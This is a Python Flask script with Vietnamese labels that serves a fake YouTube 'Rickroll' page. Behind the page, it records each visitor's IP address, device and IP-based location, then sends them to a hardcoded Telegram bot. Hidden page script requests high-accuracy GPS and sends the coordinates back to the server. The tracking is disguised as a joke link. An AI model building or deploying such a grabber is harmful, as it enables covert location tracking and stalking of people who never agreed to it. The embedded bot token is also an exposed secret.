from flask import Flask, request
import requests

BOT_TOKEN = "8691955774:AAHqYfpwCRY1w72HgsEZFn0HipXj6F_1zag"
CHAT_ID = "6152651357"

app = Flask(__name__)

def lay_ip_thật():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip: ip = ip.split(',')[0]
    return ip.strip()

def lay_vi_tri_ip(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        d = r.json()
        if d["status"] == "success":
            return f"🌍 {d['country']} | 🏙️ {d['city']} | 📍 {d['lat']},{d['lon']} | 🏢 {d['isp']}"
        return "❌ Không lấy được vị trí"
    except:
        return "❌ Lỗi kết nối lấy vị trí"

def gui_tele(IP, UA, VITRI_IP, VITRI_GPS="Chưa bật GPS"):
    text = f"""🚨 CÓ NGƯỜI MỞ LINK!
━━━━━━━━━━━━━━━━━━━━
🌐 IP: {IP}
📱 Thiết bị: {UA}
📍 Vị trí IP: {VITRI_IP}
📡 Vị trí GPS: {VITRI_GPS}
━━━━━━━━━━━━━━━━━━━━"""
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text, "disable_web_page_preview": True},
            timeout=10
        )
        print("✅ TELEGRAM OK | Status:", r.status_code)
        return True
    except Exception as e:
        print("❌ LỖI TELEGRAM |", type(e).__name__, str(e))
        return False

@app.route('/')
def index():
    IP = lay_ip_thật()
    UA = request.headers.get('User-Agent', 'Không xác định')
    VITRI_IP = lay_vi_tri_ip(IP)
    gui_tele(IP, UA, VITRI_IP)
    
    with open('log.txt', 'a', encoding='utf-8') as f:
        f.write(f"IP: {IP} | {VITRI_IP} | {UA}\n")
    
    return '''
<!DOCTYPE html>
<html>
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Rickroll {HD + No ads} - YouTube</title>
 <style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
  body{background:#0f0f0f;color:#fff}
  header{height:56px;background:#000;display:flex;align-items:center;justify-content:space-between;padding:0 16px;position:fixed;top:0;left:0;right:0;z-index:100}
  .logo{display:flex;align-items:center;gap:4px;color:red;font-weight:bold;font-size:20px;text-decoration:none}
  .search-bar{display:flex;align-items:center}
  .search-bar input{width:500px;height:40px;background:#121212;border:1px solid #303030;border-radius:20px 0 0 20px;color:#fff;padding:0 16px;font-size:16px;outline:none}
  .search-btn{height:40px;width:64px;background:#222;border:none;border-radius:0 20px 20px 0;cursor:pointer;color:#fff;font-size:18px}
  .container{max-width:1280px;margin:0 auto;padding:80px 24px 24px;display:grid;grid-template-columns:1fr 400px;gap:24px}
  .video-container{background:#000;border-radius:12px;overflow:hidden;aspect-ratio:16/9;margin-bottom:12px}
  iframe{width:100%;height:100%;border:none}
  .video-info h1{font-size:20px;margin-bottom:8px}
  .meta{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #303030;margin-bottom:16px;flex-wrap:wrap;gap:8px}
  .channel-info{display:flex;align-items:center;gap:12px;margin-bottom:16px}
  .avatar{width:40px;height:40px;border-radius:50%;background:linear-gradient(45deg,#f00,#f90);flex-shrink:0}
  .ch-name h3{font-size:14px;margin-bottom:2px}
  .ch-name p{font-size:12px;color:#aaa}
  .sub-btn{background:#fff;color:#000;border:none;padding:10px 16px;border-radius:20px;font-weight:bold;cursor:pointer;margin-left:auto}
  .desc{background:#272727;border-radius:12px;padding:12px;font-size:14px;line-height:1.5;cursor:pointer}
  .desc p{color:#ddd}
  .sidebar h3{font-size:16px;margin-bottom:12px}
  .recommend{display:flex;gap:8px;margin-bottom:12px;cursor:pointer}
  .rec-thumb{width:168px;height:94px;background:#222;border-radius:8px;flex-shrink:0;position:relative;overflow:hidden}
  .rec-thumb::after{content:"2:17";position:absolute;bottom:4px;right:4px;background:rgba(0,0,0,0.8);color:#fff;font-size:11px;padding:1px 4px;border-radius:2px}
  .rec-info h4{font-size:14px;margin-bottom:4px;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;line-height:1.4}
  .rec-info p{font-size:12px;color:#aaa;line-height:1.4}
  @media(max-width:900px){.container{grid-template-columns:1fr}.search-bar input{width:200px}}
  @media(max-width:600px){.search-bar input{width:120px}.container{padding:70px 12px 12px}}
 </style>
</head>
<body>
 <header>
  <a href="/" class="logo">▶ YouTube</a>
  <div class="search-bar"><input type="text" placeholder="Tìm kiếm"><button class="search-btn">🔍</button></div>
  <div></div>
 </header>
 <div class="container">
  <div class="main">
   <div class="video-container">
    <iframe src="https://www.youtube.com/embed/QDia3e12czc?autoplay=1&rel=0" allow="autoplay;encrypted-media;picture-in-picture" allowfullscreen></iframe>
   </div>
   <div class="video-info">
    <h1>Rickroll {HD + No ads}</h1>
    <div class="meta">
     <span>2,949,831 lượt xem • 5 năm trước</span>
    </div>
    <div class="channel-info">
     <div class="avatar"></div>
     <div class="ch-name">
      <h3>Everything is troll</h3>
      <p>41K người đăng ký</p>
     </div>
     <button class="sub-btn">Đăng ký</button>
    </div>
    <div class="desc">
     <p><strong>a rickroll without ads in hd</strong><br><br>🎵 Never Gonna Give You Up — Rick Astley</p>
    </div>
   </div>
  </div>
  <div class="sidebar">
   <h3>Video đề xuất</h3>
   <div class="recommend"><div class="rec-thumb"></div><div class="rec-info"><h4>Smartest way to RickRoll anyone...</h4><p>Beluga • 21M lượt xem</p></div></div>
   <div class="recommend"><div class="rec-thumb"></div><div class="rec-info"><h4>Rick Astley - Never Gonna Give You Up (Official Video)</h4><p>Rick Astley • 1.8B lượt xem</p></div></div>
   <div class="recommend"><div class="rec-thumb"></div><div class="rec-info"><h4>I made Flappy Bird into a PLAYABLE YouTube video!</h4><p>Atlas Arcade • 661K lượt xem</p></div></div>
   <div class="recommend"><div class="rec-thumb"></div><div class="rec-info"><h4>Rickroll {HD + No Ads + Different Link}</h4><p>Everything is troll • 465K lượt xem</p></div></div>
  </div>
 </div>
 <script>
 if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
   function(pos) {
    fetch("/save-gps?lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude + "&acc=" + pos.coords.accuracy);
   },
   function(err) {
    console.log("GPS bị từ chối hoặc lỗi:", err.message);
   },
   {enableHighAccuracy: true, timeout: 8000, maximumAge: 0}
  );
 }
 </script>
</body>
</html>
'''

@app.route('/save-gps')
def save_gps():
    lat = request.args.get('lat', '')
    lon = request.args.get('lon', '')
    acc = request.args.get('acc', '')
    IP = lay_ip_thật()
    UA = request.headers.get('User-Agent', 'Không xác định')
    VITRI_IP = lay_vi_tri_ip(IP)
    if lat and lon:
        VITRI_GPS = f"{lat},{lon} (±{acc}m)"
    else:
        VITRI_GPS = "Từ chối / Không hỗ trợ"
    gui_tele(IP, UA, VITRI_IP, VITRI_GPS)
    with open('gps_log.txt', 'a', encoding='utf-8') as f:
        f.write(f"IP: {IP} | GPS: {VITRI_GPS}\n")
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(__import__('os').getenv('PORT', 5000)))
